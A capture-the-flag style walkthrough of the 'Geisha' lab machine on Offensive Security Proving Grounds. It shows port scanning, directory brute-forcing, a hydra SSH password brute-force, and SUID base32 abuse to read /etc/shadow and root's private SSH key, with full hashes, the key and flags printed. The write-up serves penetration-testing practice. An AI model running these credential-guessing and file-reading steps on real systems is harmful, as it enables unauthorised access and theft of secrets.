---
title: Offsec-PG[GEISHA]
author: Anurag M
date: 2021-09-19 22:30:00 +0800
categories: [Offsec-PG]
tags: [ offsec-pg, brute-force, ssh, hydra, gobuster, base32, SUID ]
---

![geisha](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/geisha/geisha.png)

Geisha is a boot2root linux machine hosted on Offensive Security Playing Grounds.

## About The Machine

| Name | OS | Difficulty |
|------|----|------------|
| Geisha | Linux | Easy |

## Reconnaissance
### Nmap

```bash
┌─[v1nc1d4@V1NC1D4]─[~/Desktop/offsec-PG/geisha]
└──╼ $nmap -sC -sV -p- 192.168.54.82
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-19 18:50 IST
Nmap scan report for 192.168.54.82
Host is up (0.00077s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1b:f2:5d:cd:89:13:f2:49:00:9f:8c:f9:eb:a2:a2:0c (RSA)
|   256 31:5a:65:2e:ab:0f:59:ab:e0:33:3a:0c:fc:49:e0:5f (ECDSA)
|_  256 c6:a7:35:14:96:13:f8:de:1e:e2:bc:e7:c7:66:8b:ac (ED25519)
80/tcp   open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Geisha
7080/tcp open  ssl/http LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title: Geisha
| ssl-cert: Subject: commonName=geisha/organizationName=webadmin/countryName=US
| Not valid before: 2020-05-09T14:01:34
|_Not valid after:  2022-05-09T14:01:34
|_ssl-date: 2020-05-18T19:00:35+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
7125/tcp open  http     nginx 1.17.10
|_http-server-header: nginx/1.17.10
|_http-title: Geisha
8088/tcp open  http     LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title: Geisha
9198/tcp open  http     SimpleHTTPServer 0.6 (Python 2.7.16)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.16
|_http-title: Geisha
MAC Address: 00:0C:29:6C:ED:CD (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

There are many open ports. Let's find something juicy...

### HTTP

Since there are many open ports, started visiting them one by one, but couldn't find anything. Every page looks almost the same.

![geisha](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/geisha/1.png)

To find our way in, started to enumerate web directories. Luckily we got the `passwd` file and `shadow` file on port `7125`.

```bash
┌─[v1nc1d4@V1NC1D4]─[~/Desktop/offsec-PG/geisha]
└──╼ $gobuster dir -q -u http://192.168.54.82:7125/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
/shadow               (Status: 403) [Size: 154] <---forbidden
/passwd               (Status: 200) [Size: 1432] <---success
```

Though the `shadow` file gave `403(forbidden)` error, we could access `passwd` file. So, let's download `passwd` file.

```bash
┌─[v1nc1d4@V1NC1D4]─[~/Desktop/offsec-PG/geisha]
└──╼ $curl http://192.168.54.82:7125/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
geisha:x:1000:1000:geisha,,,:/home/geisha:/bin/bash <---system user
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lsadm:x:998:1001::/:/sbin/nologin
┌─[v1nc1d4@V1NC1D4]─[~/Desktop/offsec-PG/geisha]
└──╼ $
```

We have a system user `geisha`. As port 22 (SSH) is open let's try brute-force attack using `hydra`

```bash
┌─[v1nc1d4@V1NC1D4]─[~/Desktop/offsec-PG/geisha]
└──╼ $hydra -l geisha -P /usr/share/wordlists/rockyou.txt 192.168.54.82 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-19 19:23:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.54.82:22/
[STATUS] 111.00 tries/min, 111 tries in 00:01h, 14344289 to do in 2153:48h, 16 active
[STATUS] 112.33 tries/min, 337 tries in 00:03h, 14344063 to do in 2128:12h, 16 active
[22][ssh] host: 192.168.54.82   login: geisha   password: letmein <--- valid creds
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-19 19:28:41
┌─[✗]─[v1nc1d4@V1NC1D4]─[~/Desktop/offsec-PG/geisha]
└──╼ $
```

Boom!! We got valid credential for shh-login. 

`username : geisha`
`password : letmein`

## Gaining Foothold

Let's login to the system via `SSH` as we have found valid login credentials.

```bash
┌─[v1nc1d4@V1NC1D4]─[~/Desktop/offsec-PG/geisha]
└──╼ $ssh geisha@192.168.54.82
The authenticity of host '192.168.54.82 (192.168.54.82)' can't be established.
ECDSA key fingerprint is SHA256:VZJ2vD6+/BC5zd9v8nRSgqEHyfR17GuCELg0nE0BkFk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.54.82' (ECDSA) to the list of known hosts.
geisha@192.168.54.82's password: 
Linux geisha 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
geisha@geisha:~$ whoami;hostname
geisha
geisha
geisha@geisha:~$
```
The user flag can be found in the user's `home` folder.

```bash
geisha@geisha:~$ ls -la
total 24
drwxr-xr-x 2 geisha geisha 4096 Aug 20  2020 .
drwxr-xr-x 3 root   root   4096 May  3  2020 ..
-rw-r--r-- 1 geisha geisha  220 May  3  2020 .bash_logout
-rw-r--r-- 1 geisha geisha 3526 May  3  2020 .bashrc
-rw-r--r-- 1 geisha geisha  807 May  3  2020 .profile
-rw-r--r-- 1 geisha geisha   33 Sep 19 09:18 local.txt
geisha@geisha:~$ cat local.txt
8f602c394d30a50cd1b6000fdca6f476
geisha@geisha:~$
```

## Privilege Escalation

Checking suid permissions on the machine, we could find that we're able to run `/usr/bin/base32` as root.

```bash
geisha@geisha:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/base32 <---
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
geisha@geisha:~$
```

Let's search on [GTFOBins](https://gtfobins.github.io/gtfobins/base32/)

![katana](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/geisha/2.png)

We could read files as `root`, let's try this.

```bash
geisha@geisha:~$ base32 "/etc/shadow" | base32 --decode
root:$6$3haFwrdHJRZKWD./$LYiTApGClgwmFE3TXMRtekWpGOY6fSpnTorsQL/FBr9YdOW4NHMzYFkOLu8qJQVa1wqfEC3a.SZeTHIyEhlPF0:18446:0:99999:7:::
daemon:*:18385:0:99999:7:::
bin:*:18385:0:99999:7:::
sys:*:18385:0:99999:7:::
sync:*:18385:0:99999:7:::
games:*:18385:0:99999:7:::
man:*:18385:0:99999:7:::
lp:*:18385:0:99999:7:::
mail:*:18385:0:99999:7:::
news:*:18385:0:99999:7:::
uucp:*:18385:0:99999:7:::
proxy:*:18385:0:99999:7:::
www-data:*:18385:0:99999:7:::
backup:*:18385:0:99999:7:::
list:*:18385:0:99999:7:::
irc:*:18385:0:99999:7:::
gnats:*:18385:0:99999:7:::
nobody:*:18385:0:99999:7:::
_apt:*:18385:0:99999:7:::
systemd-timesync:*:18385:0:99999:7:::
systemd-network:*:18385:0:99999:7:::
systemd-resolve:*:18385:0:99999:7:::
messagebus:*:18385:0:99999:7:::
sshd:*:18385:0:99999:7:::
geisha:$6$YtDFbbhHHf5Ag5ej$3EjLFKW1aSNBlfAhcyjmY97eLrNtbzDWQ9z5YvSvuA65kH7ZgHR1f9VGFhAEGGqiKAtF8//U45M8QOHouQrWb.:18494:0:99999:7:::
systemd-coredump:!!:18385::::::
ftp:*:18391:0:99999:7:::
geisha@geisha:~$
```

That seem's to work. We were able to read `/etc/passwd` file, I tried to crack the `root hash` but it was non-crackable. So moving forward let's find out whether we could read root user's ssh private key.

```bash
geisha@geisha:~$ base32 "/root/.ssh/id_rsa" | base32 --decode
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA43eVw/8oSsnOSPCSyhVEnt01fIwy1YZUpEMPQ8pPkwX5uPh4
OZXrITY3JqYSCFcgJS34/TQkKLp7iG2WGmnno/Op4GchXEdSklwoGOKNA22l7pX5
89FAL1XSEBCtzlrCrksvfX08+y7tS/I8s41w4aC1TDd5o8c1Kx5lfwl7qw0ZMlbd
5yeAUhuxuvxo/KFqiUUfpcpoBf3oT2K97/bZr059VU8T4wd5LkCzKEKmK5ebWIB6
fgIfxyhEm/o3dl1lhegTtzC6PtlhuT7ty//mqEeMuipwH3ln61fHXs72LI/vTx26
TSSmzHo8zZt+/lwrgroh0ByXbCtDaZjo4HAFfQIDAQABAoIBAQCRXy/b3wpFIcww
WW+2rvj3/q/cNU2XoQ4fHKx4yqcocz0xtbpAM0veIeQFU0VbBzOID2V9jQE+9k9U
1ZSEtQJRibwbqk1ryDlBSJxnqwIsGrtdS4Q/CpBWsCZcFgy+QMsC0RI8xPlgHpGR
Y/LfXZmy2R6E4z9eKEYWlIqRMeJTYgqsP6ZR4SOLuZS1Aq/lq/v9jqGs/SQenjRb
8zt1BoqCfOp5TtY1NoBLqaPwmDt8+rlQt1IM+2aYmxdUkLFTcMpCGMADggggtnR+
10pZkA6wM8/FlxyAFcNwt+H3xu5VKuQKdqTfh1EuO3c34UmuS1qnidHO1rYWOhYO
jceQYzoBAoGBAP/Ml6cp2OWqrheJS9Pgnvz82n+s9yM5raKNnH57j0sbEp++eG7o
2po5/vrLBcCHGqZ7+RNFXDmRBEMToru/m2RikSVYk8QHLxVZJt5iB3tcxmglGJj/
cLkGM71JqjHX/edwu2nNu14m4l1JV9LGvvHR5m6uU5cQvdcMTsRpkuxdAoGBAOOl
THxiQ6R6HkOt9w/WrKDIeGskIXj/P/79aB/2p17M6K+cy75OOYzqkDPENrxK8bub
RaTzq4Zl2pAqxvsv/CHuJU/xHs9T3Ox7A1hWqnOOk2f0KBmhQTYBs2OKqXXZotHH
xvkOgc0fqRm1QYlCK2lyBBM14O5Isud1ZZXLUOuhAoGBAIBds1z36xiV5nd5NsxE
1IQwf5XCvuK2dyQz3Gy8pNQT6eywMM+3mrv6jrJcX66WHhGd9QhurjFVTMY8fFWr
edeOfzg2kzC0SjR0YMUIfKizjf2FYCqnRXIUYrKC3R3WPlx+fg5CZ9x/tukJfUEQ
65F+vBye7uPISvw3+O8n68shAoGABXMyppOvrONjkBk9Hfr0vRCvmVkPGBd8T71/
XayJC0L6myG02wSCajY/Z43eBZoBuY0ZGL7gr2IG3oa3ptHaRnGuIQDTzQDj/CFh
zh6dDBEwxD9bKmnq5sEZq1tpfTHNrRoMUHAheWi1orDtNb0Izwh0woT6spm49sOf
v/tTH6ECgYEA/tBeKSVGm0UxGrjpQmhW/9Po62JNz6ZBaTELm3paaxqGtA+0HD0M
OuzD6TBG6zBF6jW8VLQfiQzIMEUcGa8iJXhI6bemiX6Te1PWC8NMMULhCjObMjCv
bf+qz0sVYfPb95SQb4vvFjp5XDVdAdtQov7s7XmHyJbZ48r8ISHm98s=
-----END RSA PRIVATE KEY-----

geisha@geisha:~$
```

Yes, we could also read ssh key. Let's use this to login as root.
For that, let's save the private ssh key into `root.key` and change the permission of the file to `read and write`

```bash
geisha@geisha:~$ base32 "/root/.ssh/id_rsa" | base32 --decode > root.key
geisha@geisha:~$ ls -la
total 28
drwxr-xr-x 2 geisha geisha 4096 Sep 19 10:00 .
drwxr-xr-x 3 root   root   4096 May  3  2020 ..
-rw-r--r-- 1 geisha geisha  220 May  3  2020 .bash_logout
-rw-r--r-- 1 geisha geisha 3526 May  3  2020 .bashrc
-rw-r--r-- 1 geisha geisha  807 May  3  2020 .profile
-rw-r--r-- 1 geisha geisha   33 Sep 19 09:18 local.txt
-rw-r--r-- 1 geisha geisha 1680 Sep 19 10:00 root.key <--- root ssh private key
geisha@geisha:~$ chmod 600 root.key <--- changing permission to read and write
geisha@geisha:~$ 
```

Now we could just connect to the root user via ssh.

```bash
geisha@geisha:~$ ssh -i root.key root@localhost
The authenticity of host 'localhost (::1)' can't be established.
ECDSA key fingerprint is SHA256:VZJ2vD6+/BC5zd9v8nRSgqEHyfR17GuCELg0nE0BkFk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
Linux geisha 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@geisha:~# whomai;hostname
-bash: whomai: command not found
geisha
root@geisha:~# whoami;hostname
root
geisha
root@geisha:~#
```

Root flag can be found in `/root` directory

```bash
root@geisha:~# cd /root
root@geisha:~# ls -la
total 36
drwx------  4 root root 4096 Sep 19 09:30 .
drwxr-xr-x 18 root root 4096 Jul  3  2020 ..
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 May  9  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 May  9  2020 .selected_editor
drwxr-xr-x  2 root root 4096 May  9  2020 .ssh
-rw-r--r--  1 root root   32 Aug 20  2020 flag.txt
-rw-r--r--  1 root root   33 Sep 19 09:18 proof.txt
root@geisha:~# cat flag.txt
Your flag is in another file...
root@geisha:~# cat proof.txt
96b3a364f6df56fffded3d18ce1e9ffc
root@geisha:~# 
```
## Resources

| Topic | Url |
|-------|-----|
| GTFOBins-Base32 | [Click here](https://gtfobins.github.io/gtfobins/base32/) |
